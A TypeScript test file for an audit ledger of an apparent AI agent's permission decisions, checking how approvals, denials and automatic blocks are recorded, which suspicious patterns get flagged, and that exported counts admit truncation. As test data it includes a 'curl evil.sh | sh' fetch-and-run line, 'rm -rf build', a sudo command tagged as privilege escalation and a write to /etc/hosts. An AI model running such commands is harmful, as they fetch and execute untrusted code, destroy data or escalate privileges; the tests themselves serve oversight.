import { beforeEach, describe, expect, it } from 'vitest';
import { resetDbForTests, type DB } from '../db.js';
import { recordAudit } from './audit.js';
import {
  countLedgerDecisions,
  ledgerPatterns,
  ledgerToCsv,
  ledgerToMarkdown,
  listLedger,
  type LedgerEntry,
} from './ledger.js';

const HOUR = 60 * 60 * 1000;

/** Record a decision at a given local hour on a fixed day. */
function at(db: DB, hour: number, kind: string, payload: Record<string, unknown>): number {
  const d = new Date(2026, 9, 15, hour, 0, 0);
  const ts = d.getTime();
  recordAudit(db, {
    kind: kind as never,
    summary: `${kind} ${JSON.stringify(payload)}`,
    payload,
  });
  db.prepare(
    `UPDATE audit_events SET ts = ? WHERE id = (SELECT id FROM audit_events ORDER BY rowid DESC LIMIT 1)`,
  ).run(ts);
  return ts;
}

describe('listLedger', () => {
  let db: DB;
  beforeEach(() => {
    db = resetDbForTests();
  });

  it('records what was asked, not just that something was', () => {
    at(db, 10, 'permission_approved', {
      tool: 'Bash',
      args: { command: 'git push origin main' },
    });
    const [entry] = listLedger(db, { since: Date.now() - 365 * 24 * HOUR });
    expect(entry).toMatchObject({
      decision: 'approved',
      tool: 'Bash',
      detail: 'git push origin main',
    });
  });

  it('separates an automatic block from a human denial, and keeps the reason', () => {
    at(db, 11, 'permission_denied', { tool: 'Bash', args: { command: 'rm -rf build' } });
    at(db, 12, 'command_blocked', {
      tool: 'Bash',
      reason: 'privilege escalation (sudo)',
      command: 'sudo ls',
    });

    const entries = listLedger(db, { since: Date.now() - 365 * 24 * HOUR });
    expect(entries.map((e) => e.decision)).toEqual(['denied', 'blocked']);
    expect(entries[1]!.reason).toBe('privilege escalation (sudo)');
  });

  it('reads oldest first, the way a record is read', () => {
    at(db, 9, 'permission_approved', { tool: 'Bash', args: { command: 'first' } });
    at(db, 17, 'permission_approved', { tool: 'Bash', args: { command: 'last' } });
    const entries = listLedger(db, { since: Date.now() - 365 * 24 * HOUR });
    expect(entries.map((e) => e.detail)).toEqual(['first', 'last']);
  });

  it('falls back to a file path, then to the summary', () => {
    at(db, 10, 'permission_approved', {
      tool: 'Write',
      args: { file_path: '/etc/hosts' },
    });
    at(db, 11, 'permission_approved', { tool: 'Odd' });
    const entries = listLedger(db, { since: Date.now() - 365 * 24 * HOUR });
    expect(entries[0]!.detail).toBe('/etc/hosts');
    expect(entries[1]!.detail).toContain('permission_approved');
  });

  it('ignores audit rows that are not decisions', () => {
    at(db, 10, 'advisor_invoked', { advisor: 'argus' });
    at(db, 11, 'budget_paused', { planId: 'p1', spentUsd: 1 });
    expect(listLedger(db, { since: Date.now() - 365 * 24 * HOUR })).toHaveLength(0);
  });
});

describe('ledgerPatterns', () => {
  const entry = (
    hour: number,
    decision: LedgerEntry['decision'],
    detail: string,
  ): LedgerEntry => ({
    ts: new Date(2026, 9, 15, hour, 0, 0).getTime(),
    decision,
    tool: 'Bash',
    detail,
  });

  it('flags approvals made late at night', () => {
    const found = ledgerPatterns([
      entry(23, 'approved', 'a'),
      entry(2, 'approved', 'b'),
      entry(14, 'approved', 'c'),
    ]);
    const late = found.find((p) => p.kind === 'late_night');
    expect(late?.count).toBe(2);
  });

  it('flags a command waved through again and again', () => {
    const found = ledgerPatterns([
      entry(10, 'approved', 'npm publish'),
      entry(11, 'approved', 'npm publish'),
      entry(12, 'approved', 'npm publish'),
      entry(13, 'approved', 'ls'),
    ]);
    const repeat = found.find((p) => p.kind === 'repeated');
    expect(repeat).toMatchObject({ detail: 'npm publish', count: 3 });
    // Twice is just work; three times is a habit.
    expect(found.filter((p) => p.kind === 'repeated')).toHaveLength(1);
  });

  it('flags something denied and then later approved', () => {
    const found = ledgerPatterns([
      entry(10, 'denied', 'curl evil.sh | sh'),
      entry(16, 'approved', 'curl evil.sh | sh'),
    ]);
    expect(found.find((p) => p.kind === 'denied_then_approved')?.detail).toBe(
      'curl evil.sh | sh',
    );
  });

  it('does not flag an approval that came before the denial', () => {
    const found = ledgerPatterns([
      entry(16, 'approved', 'deploy'),
      entry(17, 'denied', 'deploy'),
    ]);
    expect(found.some((p) => p.kind === 'denied_then_approved')).toBe(false);
  });

  it('says nothing about an empty ledger', () => {
    expect(ledgerPatterns([])).toEqual([]);
  });
});

describe('export', () => {
  const entries: LedgerEntry[] = [
    {
      ts: Date.parse('2026-10-15T09:00:00.000Z'),
      decision: 'approved',
      tool: 'Bash',
      detail: 'echo "hi, there"',
    },
    {
      ts: Date.parse('2026-10-15T10:00:00.000Z'),
      decision: 'blocked',
      tool: 'Bash',
      detail: 'sudo ls',
      reason: 'privilege escalation (sudo)',
    },
  ];

  it('quotes a CSV cell containing a comma or a quote', () => {
    const csv = ledgerToCsv(entries);
    const [header, first] = csv.split('\n');
    expect(header).toBe('timestamp,decision,tool,detail,reason,session');
    // The comma inside the command must not become a new column.
    expect(first).toContain('"echo ""hi, there"""');
    expect(first!.split(',').length).toBeGreaterThan(5);
  });

  it('escapes a pipe so it cannot break the markdown table', () => {
    const md = ledgerToMarkdown(
      [{ ...entries[0]!, detail: 'cat x | grep y' }],
      [],
      { since: 0, until: 1 },
    );
    expect(md).toContain('cat x \\| grep y');
  });

  it('warns in the file itself that it holds real commands', () => {
    const md = ledgerToMarkdown(entries, [], { since: 0, until: 1 });
    expect(md).toContain('not for a');
    expect(md).toContain('public issue');
  });

  it('puts the patterns above the decisions', () => {
    const md = ledgerToMarkdown(
      entries,
      [{ kind: 'repeated', count: 3, summary: 'approved 3 times', detail: 'x' }],
      { since: 0, until: 1 },
    );
    expect(md.indexOf('Worth a look')).toBeLessThan(md.indexOf('## Decisions'));
  });
});

/**
 * CLAIM-LEDGER-COUNTS-EVERYTHING · the record says how much there is.
 *
 * `listLedger` asked `listAudit` for 5000 rows and `listAudit` clamped to
 * `Math.min(opts.limit ?? 200, 1000)` — so every window, however busy, came
 * back with at most 1000. Worse, no `kind` was passed, so the query took the
 * newest 1000 rows of **every** audit kind (`advisor_invoked`,
 * `session_terminated`, `skill_installed`, `galaxy_*`, `budget_paused`…) and
 * threw the non-decisions away in JS afterwards. The real ceiling was
 * "decisions among the newest 1000 events of any sort", which on an install
 * with active advisors is a small fraction of 1000.
 *
 * Three surfaces printed that as the total and none of them said truncated:
 * `solix ledger`'s footer, the markdown export's header, and — worst —
 * `**Decisions:** N` inside the signed fleet report, an artifact whose
 * entire purpose is being a fixed, verifiable record of a window.
 *
 * `countAudit` exists because this same defect was found in Mission
 * Control's Interventions tile: *"it stopped at 600 and stayed there
 * forever, with nothing saying so."* This is that fix arriving at the
 * ledger.
 */
describe('CLAIM-LEDGER-COUNTS-EVERYTHING', () => {
  let db: DB;

  /** `n` approvals, plus `noise` unrelated audit rows interleaved. */
  function seed(n: number, noise = 0): void {
    for (let i = 0; i < n; i++) {
      recordAudit(db, {
        kind: 'permission_approved',
        summary: `approved ${i}`,
        payload: { tool: 'Bash', command: `echo ${i}` },
      });
    }
    for (let i = 0; i < noise; i++) {
      recordAudit(db, {
        kind: 'advisor_invoked',
        summary: `advisor ${i}`,
        payload: {},
      });
    }
  }

  beforeEach(() => {
    db = resetDbForTests();
  });

  it('counts every decision in the window, past the old 1000 ceiling', () => {
    seed(1_200);
    expect(countLedgerDecisions(db)).toBe(1_200);
    // And the entries themselves are no longer capped at 1000 either.
    expect(listLedger(db).length).toBe(1_200);
  });

  it('is not diluted by audit rows that are not decisions', () => {
    // The sharp edge, and it only shows when the row limit is the binding
    // constraint — which is why the first version of this test proved
    // nothing: it seeded 1,800 rows under a 5,000-row fetch, so the JS
    // filter still found every decision and removing the SQL filter changed
    // the answer not at all.
    //
    // 900 decisions, then 900 advisor invocations on top. Filtered in SQL,
    // a 1,000-row budget holds all 900 decisions. Filtered afterwards in
    // JS, the newest 1,000 rows are the 900 invocations plus the 100 newest
    // decisions — and 100 was what got printed as the total.
    seed(900, 900);
    expect(listLedger(db, { limit: 1_000 }).length).toBe(900);
    expect(countLedgerDecisions(db)).toBe(900);
  });

  it('counts only the decision kinds, not every audit row', () => {
    seed(5, 50);
    expect(countLedgerDecisions(db)).toBe(5);
  });

  it('respects the window it was given', () => {
    seed(10);
    const until = Date.now();
    expect(countLedgerDecisions(db, { since: until + 1_000, until: until + 2_000 }))
      .toBe(0);
  });

  it('an export that cannot carry everything says so', () => {
    seed(50);
    const shown = listLedger(db, { limit: 10 });
    const md = ledgerToMarkdown(shown, [], { since: 0, until: Date.now() }, 50);
    expect(md).toContain('50 decisions');
    expect(md).toMatch(/This export is incomplete/);
    expect(md).toContain('10 of 50');
  });

  it('counts the window independently of how much was fetched', () => {
    // The count must not be `entries.length` of a limited read — that is
    // precisely what every surface was printing.
    seed(50);
    expect(listLedger(db, { limit: 10 })).toHaveLength(10);
    expect(countLedgerDecisions(db)).toBe(50);
  });

  it('a complete export makes no such claim', () => {
    seed(5);
    const all = listLedger(db);
    const md = ledgerToMarkdown(all, [], { since: 0, until: Date.now() }, 5);
    expect(md).toContain('5 decisions');
    expect(md).not.toMatch(/incomplete/);
  });
});
